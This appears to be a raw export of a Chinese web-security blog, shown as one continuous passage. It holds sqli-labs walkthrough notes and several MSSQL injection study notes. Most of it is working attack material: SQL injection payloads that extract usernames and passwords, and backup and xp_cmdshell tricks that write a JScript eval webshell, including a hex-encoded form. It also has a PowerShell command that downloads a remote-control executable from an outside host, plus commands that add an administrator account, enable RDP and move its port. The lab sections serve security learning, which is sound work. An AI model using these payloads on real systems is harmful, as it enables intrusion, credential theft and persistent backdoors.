class="line"><span class="comment">//XPATH syntax error: '~id,username,password~'</span></span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-5</span>/?id=<span class="number">1'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select username from users limit <span class="number">4</span>,<span class="number">1</span>),<span class="number">0x7e</span>)) --+</span><br><span class="line"><span class="comment">//XPATH syntax error: '~stupid~'</span></span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-5</span>/?id=<span class="number">1'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select password from users limit <span class="number">4</span>,<span class="number">1</span>),<span class="number">0x7e</span>)) --+</span><br><span class="line"><span class="comment">//XPATH syntax error: '~stupidity~'</span></span><br></pre></td></tr></table></figure><p>比较详细的报错注入原理分析：<a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a></p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>加双引号，报错，但是没有显位，使用双查询（Double Injection）报错注入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-6</span>/?id=<span class="number">1</span><span class="string">" and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</span></span><br><span class="line"><span class="string">//XPATH syntax error: '~security~'</span></span><br></pre></td></tr></table></figure><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>本题使用文件输出的方式注入。</p><ul><li><code>outfile</code> 可输出多行数据</li><li><code>dumpfile</code> 只可输出单行数据</li></ul><p>使用单引号，报错，尝试使用两个括号闭合，语句正常。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-7</span>/?id=<span class="number">1'</span>)) -+</span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-7</span>/?id=<span class="number">1'</span>)) order by <span class="number">4</span> -+</span><br><span class="line"><span class="comment">//Error 字段数为3</span></span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-7</span>/?id=<span class="number">1'</span>)) <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> into outfile <span class="string">"/var/www/html/Less-7/union1.txt"</span> --+</span><br><span class="line"><span class="comment">//测试文件输出，由于是docker搭建的，路径盲猜，可以通过docker打开查看。输出结果为：</span></span><br><span class="line"><span class="comment">// 1    Dumb    Dumb</span></span><br><span class="line"><span class="comment">// 1    2       3</span></span><br><span class="line"></span><br><span class="line">localhost/Less<span class="number">-7</span>/?id=<span class="number">1'</span>)) <span class="keyword">union</span> select <span class="number">1</span>,username,password from users into outfile <span class="string">"/var/www/html/Less-7/union2.txt"</span> --+</span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>跳过中间步骤，可得到:</p><p><img src="./less7-fig-1.png" alt="less7-fig-1"></p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>单引号布尔盲注，可以使用时间盲注:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-8</span>/?id=<span class="number">1'</span> <span class="keyword">and</span> ascii(substr((select database()),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">115</span> --+</span><br><span class="line"><span class="comment">//114正常，115报错 -&gt; 字符's'</span></span><br></pre></td></tr></table></figure><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>可以使用时间盲注:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-9</span>/?id=<span class="number">1'</span> <span class="keyword">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>)) --+</span><br></pre></td></tr></table></figure><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>双引号时间盲注:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/Less<span class="number">-10</span>/?id=<span class="number">1</span><span class="string">" and If(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) --+</span></span><br></pre></td></tr></table></figure><h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>POST注入，输入单引号报错，报错注入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username='</span><br><span class="line">password=</span><br><span class="line"><span class="comment">//报错syntax to use near '''' and password='' LIMIT 0,1' at line 1</span></span><br><span class="line"></span><br><span class="line">username=<span class="number">1'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select @@version),<span class="number">0x7e</span>)) #</span><br><span class="line">password=<span class="number">1'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()),<span class="number">0x7e</span>)) #</span><br></pre></td></tr></table></figure><p>这里需要用<code>#</code>注释。</p><p>另一种方法，闭合引号之后，用<code>or 1=1</code>绕过登录，爆出用户名密码，配合<code>LIMIT</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">username=' or 1=1 limit 0,1 #</span><br><span class="line">password=</span><br><span class="line"><span class="comment">//Your Login name:Dumb</span></span><br><span class="line"><span class="comment">//Your Password:Dumb</span></span><br><span class="line"></span><br><span class="line">username=' or 1=1 limit 2,1 #</span><br><span class="line">password=</span><br><span class="line"><span class="comment">//Your Login name:Dummy</span></span><br><span class="line"><span class="comment">//Your Password:p@ssword</span></span><br></pre></td></tr></table></figure><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>POST注入，输入双引号括号闭合，注入流程同上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="string">") or 1=1 limit 2,1 #</span></span><br><span class="line"><span class="string">password=</span></span><br><span class="line"><span class="string">//Your Login name:Dummy</span></span><br><span class="line"><span class="string">//Your Password:p@ssword</span></span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://p0desta.com/2018/01/28/Sqli_labs%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/" target="_blank" rel="noopener">Sqli-labs通关文档</a></p><p><a href="https://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%95(1-53)/#Preparation" target="_blank" rel="noopener">Sqli-lab速刷记录(1-53)</a></p><p><a href="http://www.securitytube.net/user/Audi" target="_blank" rel="noopener">Audi’s Sqli-Labs Series</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MS SQL Server db_owner 权限处理学习笔记</title>
      <link href="/2020/05/03/MS-SQL-DB-OWNER-Notes/"/>
      <url>/2020/05/03/MS-SQL-DB-OWNER-Notes/</url>
      
        <content type="html"><![CDATA[<h2 id="权限判断"><a href="#权限判断" class="headerlink" title="权限判断"></a>权限判断</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">'sysadmin'</span>)) //判断是否是系统管理员</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">Select</span> IS_MEMBER(<span class="string">'db_owner'</span>)) //判断是否是库权限</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>= (<span class="keyword">Select</span> HAS_DBACCESS(<span class="string">'master'</span>)) //判断是否有库读取权限</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="GetShell-姿势"><a href="#GetShell-姿势" class="headerlink" title="GetShell 姿势"></a>GetShell 姿势</h2><p>前提：</p><ul><li>db_owner权限</li><li>网站物理路径</li></ul><h3 id="Log备份Getshell"><a href="#Log备份Getshell" class="headerlink" title="Log备份Getshell"></a>Log备份Getshell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">alter</span> <span class="keyword">database</span> <span class="keyword">test</span> <span class="keyword">set</span> <span class="keyword">RECOVERY</span> <span class="keyword">FULL</span><span class="comment">--</span></span><br><span class="line">;<span class="keyword">create</span> <span class="keyword">table</span> cmd (a image)<span class="comment">--</span></span><br><span class="line">;<span class="keyword">backup</span> <span class="keyword">log</span> <span class="keyword">test</span> <span class="keyword">to</span> disk = <span class="string">'c:/1.bak'</span> <span class="keyword">with</span> init<span class="comment">--</span></span><br><span class="line">;<span class="keyword">insert</span> <span class="keyword">into</span> cmd (a) <span class="keyword">values</span> (<span class="string">'&lt;%@ Page Language="Jscript"%&gt; %eval(Request.Item["hackdog"],"unsafe");%&gt;'</span>)<span class="comment">--</span></span><br><span class="line">;<span class="keyword">backup</span> <span class="keyword">log</span> <span class="keyword">test</span> <span class="keyword">to</span> disk = <span class="string">'C:/Users/Administrator/Desktop/wwwroot/xf.aspx'</span><span class="comment">--</span></span><br><span class="line">;<span class="keyword">drop</span> <span class="keyword">table</span> cmd<span class="comment">--</span></span><br></pre></td></tr></table></figure><h3 id="差异备份Getshell"><a href="#差异备份Getshell" class="headerlink" title="差异备份Getshell"></a>差异备份Getshell</h3><ol><li><p>首先完整备份一次(c:\ddd.bak为所备份未见)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">backup</span> <span class="keyword">database</span> 库名 <span class="keyword">to</span> disk = <span class="string">'c:\ddd.bak'</span>;<span class="comment">--</span></span><br></pre></td></tr></table></figure></li><li><p>创建表并插曲入数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [dbo].[dtest] ([cmd] [image]);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> dtest(cmd) <span class="keyword">values</span>(<span class="number">0x3c25402050616765204c616e67756167653d224a73637269707422253e20256576616c285265717</span> <span class="number">56573742e4974656</span>d5b226861636b646f67225d2c22756e7361666522293b253e);<span class="comment">--</span></span><br></pre></td></tr></table></figure></li><li><p>进行差异备份</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">backup</span> <span class="keyword">database</span> 库名 <span class="keyword">to</span> disk=<span class="string">'目标位置\d.asp'</span> <span class="keyword">WITH</span> DIFFERENTIAL,<span class="keyword">FORMAT</span>;<span class="comment">--</span></span><br></pre></td></tr></table></figure></li></ol><p>上面 <code>0x3c25402050616765204c616e67756167653d224a73637269707422253e20256576616c2852657175657374 2e4974656d5b226861636b646f67225d2c22756e7361666522293b253e</code><br>就是一句话木马的内容:<code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;hackdog&quot;],&quot;unsafe&quot;);%&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MSSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MS SQL Server Sa 权限处理学习笔记</title>
      <link href="/2020/05/02/MS-SQL-Sa-Notes/"/>
      <url>/2020/05/02/MS-SQL-Sa-Notes/</url>
      
        <content type="html"><![CDATA[<h2 id="MSSQL-权限处理"><a href="#MSSQL-权限处理" class="headerlink" title="MSSQL 权限处理"></a>MSSQL 权限处理</h2><p>sa全称：<code>sysadmin</code></p><p>3个权限：<code>sysadmin</code>，<code>db_owner</code>，<code>public</code></p><p>sa权限的处理方法：</p><ul><li>写 webshell</li><li>下载执行<code>反向远程控制服务端</code></li><li>添加用户（不推荐）</li></ul><a id="more"></a><h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><h3 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">低权限下也可以写，只需要写权限</span><br></pre></td></tr></table></figure><ul><li>有回显，想要回显，要把执行结果写到表里面，然后读取表的内容即可。</li><li>无回显，通过执行写命令</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">and exists (<span class="keyword">select</span> * <span class="keyword">from</span> sysobjects) //判断是否是MSSQL</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> @@<span class="keyword">VERSION</span>) //MSSQL版本</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> db_name()) //当前数据库名</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> @@servername) //本地服务名</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">'sysadmin'</span>)) //判断是否是系统管理员</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">Select</span> IS_MEMBER(<span class="string">'db_owner'</span>)) //判断是否是库权限</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>= (<span class="keyword">Select</span> HAS_DBACCESS(<span class="string">'master'</span>)) //判断是否有库读取权限</span><br></pre></td></tr></table></figure><p>有系统管理员权限，可以执行命令。使用数据库扩展存储过程执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell</span><br></pre></td></tr></table></figure><p>此命令需用<code>;</code>与前一句语句隔开。</p><p>启用:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">', 1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">', 1;RECONFIGURE;</span></span><br></pre></td></tr></table></figure><p>关闭一样.只是将上面的后面的那个”1”改成”0”就可以了：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure '<span class="keyword">show</span> <span class="keyword">advanced</span> options<span class="string">', 1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell<span class="string">', 0;RECONFIGURE;</span></span><br></pre></td></tr></table></figure><p>写入一句话木马(注：，命令中特殊字符需要转义)：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; exec master..xp_cmdshell 'echo ^&lt;^%^@ Page Language^=^"Jscript^"^%^&gt;^&lt;^%eval^(Request.Item^[^"chopper^"^],^"unsafe^"^);^%^&gt; &gt; c:/inetpub/wwwroot/muma.aspx' --</span><br></pre></td></tr></table></figure><p>注：xp_cmdshell后面命令用单引号<code>&#39;</code>。</p><h3 id="没有爆出路径的解决方法"><a href="#没有爆出路径的解决方法" class="headerlink" title="没有爆出路径的解决方法*"></a>没有爆出路径的解决方法*</h3><p>For循环查找文件并写shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for %i in (c) do (c: %i \ &amp; (for \r %j in (*default.aspx) do echo ^xf1433&gt;&gt;%~dpj3.aspx))</span><br></pre></td></tr></table></figure><p>在<code>c</code>盘里查找拥有<code>*default.aspx</code>文件的目录位置。从当前起始目录开始寻找。</p><p>缺点：如果当前执行目录与网站目录不在同意个盘符，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for \r c:\ %in (default*.aspx) do @echo ^&lt;^%^@ Page Language^=^"Jscript^"^%^&gt;^&lt;^%eval^(Request.Item^[^"chopper^"^],^"unsafe^"^);^%^&gt; &gt; %~$PATH:idark5.aspx</span><br></pre></td></tr></table></figure><p><code>%~$PATH:i</code>：查找的文件的全路径，例如<code>c:\Users\default.aspx</code><br><code>%~$PATH:idark5.aspx</code>：输出文件为：<code>c:\Users\default.aspxdark5.aspx</code></p><p>如果连接失败，可能是WAF的原因。</p><h2 id="下载-执行-反向-远程控制-服务端"><a href="#下载-执行-反向-远程控制-服务端" class="headerlink" title="下载 执行 反向 远程控制 服务端"></a>下载 执行 反向 远程控制 服务端</h2><p>优点：直接拿到cmd远程执行，可交互<br>缺点：需要良好免杀功能，需要知道目标机杀软</p><p>自带下载命令：</p><ul><li><p>certutil //windows xp/2003 测试失败</p></li><li><p>bitsadmin //win 7/2008+</p></li><li><p>powershell //win 7/2008+</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -c (new-object System.Net.Webclient).DownloadFile('http://192.168.0.1/1.exe,'c:\windows\temp\1.exe' )</span><br></pre></td></tr></table></figure></li><li><p>vbs</p></li></ul><h3 id="搭建网络服务器"><a href="#搭建网络服务器" class="headerlink" title="搭建网络服务器"></a>搭建网络服务器</h3><p>python一句话开启web服务（需要一台公网VPS）</p><h3 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h3><p>MSF，大灰狼远控。</p><h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当前权限是有添加用户的权限，需要administrator或system;</span><br><span class="line">在外网;</span><br><span class="line">可以连接;</span><br></pre></td></tr></table></figure><p>NT Authority \ Network Service 权限，可以执行CMD命令，下载webshell，但权限较低，无法获得密码明文，查看系统权限，</p><h3 id="添加用户命令"><a href="#添加用户命令" class="headerlink" title="添加用户命令"></a>添加用户命令</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user dark dark5.net123 / add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators dark / add</span><br></pre></td></tr></table></figure><p>具有连接远程桌面的权限，有时需要添加远程管理员用户组：</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> localgroup “Remote Management User” dark / add</span><br></pre></td></tr></table></figure><h3 id="DOS下开3389-并修改端口号"><a href="#DOS下开3389-并修改端口号" class="headerlink" title="DOS下开3389 并修改端口号"></a>DOS下开3389 并修改端口号</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sc config termservice <span class="built_in">start</span>= auto</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> termservice</span><br><span class="line"></span><br><span class="line">//允许外连</span><br><span class="line"></span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span>x0 /f</span><br><span class="line"></span><br><span class="line">//该<span class="number">3389</span>端口到<span class="number">80</span></span><br><span class="line"></span><br><span class="line">reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d <span class="number">80</span> /f</span><br></pre></td></tr></table></figure><p>如果遇到防火墙，需要慎重考虑，关闭防火墙或者修改策略。</p><p><a href="https://www.cnblogs.com/zhen656/p/4275270.html" target="_blank" rel="noopener">netsh配置Windows防火墙（advfirewall）</a></p><h3 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user dark / <span class="built_in">del</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/94YY/archive/2011/05/16/2047728.html" target="_blank" rel="noopener">MSsql注入取得网站路径最好的方法</a></p><p><a href="https://www.freebuf.com/column/166974.html" target="_blank" rel="noopener">如何耍好中国菜刀（文末有彩蛋）</a></p><p><a href="https://evi1cg.me/archives/remote_exec.html" target="_blank" rel="noopener">windows命令执行漏洞不会玩？ 看我！</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MSSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MS SQL Server 盲注学习笔记</title>
      <link href="/2020/05/01/MS-SQL-Blind-Notes/"/>
      <url>/2020/05/01/MS-SQL-Blind-Notes/</url>
      
        <content type="html"><![CDATA[<h2 id="延时型盲注"><a href="#延时型盲注" class="headerlink" title="延时型盲注"></a>延时型盲注</h2><h3 id="WAITFOR-DELAY-延时函数"><a href="#WAITFOR-DELAY-延时函数" class="headerlink" title="WAITFOR DELAY 延时函数"></a>WAITFOR DELAY 延时函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAITFOR DELAY '0:0:4' <span class="comment">-- 表示延迟4秒</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="IF-exists-子句"><a href="#IF-exists-子句" class="headerlink" title="IF exists ()子句"></a>IF exists ()子句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF exists () WAITFOR DELAY '0:0:5'</span><br></pre></td></tr></table></figure><h2 id="延时型盲注注入流程"><a href="#延时型盲注注入流程" class="headerlink" title="延时型盲注注入流程"></a>延时型盲注注入流程</h2><h3 id="延时判断是否存在注入"><a href="#延时判断是否存在注入" class="headerlink" title="延时判断是否存在注入"></a>延时判断是否存在注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WAITFOR DELAY '0:0:4'</span><br></pre></td></tr></table></figure><h3 id="延时猜测数据库名"><a href="#延时猜测数据库名" class="headerlink" title="延时猜测数据库名"></a>延时猜测数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IF exists (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> Master..SysDatabases <span class="keyword">where</span></span><br><span class="line"><span class="keyword">unicode</span>(<span class="keyword">substring</span>(<span class="keyword">name</span>,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">109</span>) WAITFOR DELAY <span class="string">'0:0:5'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><p>master..sysdatabases<br>数据库名:master<br>表名:sysdatabases</p><h3 id="延时猜解表名"><a href="#延时猜解表名" class="headerlink" title="延时猜解表名"></a>延时猜解表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF exists (<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(table_name,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">109</span>) WAITFOR DELAY <span class="string">'0:0:5'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><h3 id="延时猜解列名"><a href="#延时猜解列名" class="headerlink" title="延时猜解列名"></a>延时猜解列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF exists (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> syscolumns <span class="keyword">where</span> <span class="keyword">id</span> =(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'表名'</span>) <span class="keyword">and</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(<span class="keyword">name</span>,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">117</span>) WAITFOR DELAY <span class="string">'0:0:5'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><h3 id="延时逐字猜解数据"><a href="#延时逐字猜解数据" class="headerlink" title="延时逐字猜解数据"></a>延时逐字猜解数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IF exists (<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(列名<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">97</span> <span class="keyword">and</span> <span class="keyword">ID</span>=<span class="number">1</span>) WAITFOR DELAY <span class="string">'0:0:5'</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">IF</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(列名<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">55</span> <span class="keyword">and</span> <span class="keyword">ID</span>=<span class="number">1</span>) WAITFOR DELAY <span class="string">'0:0:5'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><h2 id="布尔型盲注流程"><a href="#布尔型盲注流程" class="headerlink" title="布尔型盲注流程"></a>布尔型盲注流程</h2><h3 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">'</span><br><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br></pre></td></tr></table></figure><h3 id="猜测数据库名"><a href="#猜测数据库名" class="headerlink" title="猜测数据库名"></a>猜测数据库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and exists(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(<span class="keyword">name</span>,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">109</span>)</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(<span class="keyword">name</span>,<span class="number">2</span>,<span class="number">1</span>))=<span class="number">111</span>)</span><br><span class="line">.......</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">unicode</span>(<span class="keyword">substring</span>(<span class="keyword">name</span>,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">111</span> <span class="keyword">and</span> <span class="keyword">name</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">'mozhe_db_v2.dbo.sysobjects'</span>))</span><br></pre></td></tr></table></figure><h3 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and exists(<span class="keyword">select</span> top <span class="number">1</span> <span 